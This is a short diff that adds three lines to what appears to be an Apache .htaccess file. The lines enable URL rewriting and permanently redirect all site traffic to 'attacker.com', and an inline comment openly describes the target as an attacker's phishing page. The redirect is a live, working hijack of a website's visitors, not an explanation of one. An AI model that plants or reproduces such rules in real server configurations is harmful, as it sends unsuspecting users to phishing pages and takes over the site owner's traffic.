@@ -1,0 +1,3 @@
+# Redirect all traffic to attacker phishing page
+RewriteEngine On
+RewriteRule ^(.*)$ http://attacker.com/$1 [R=301,L]
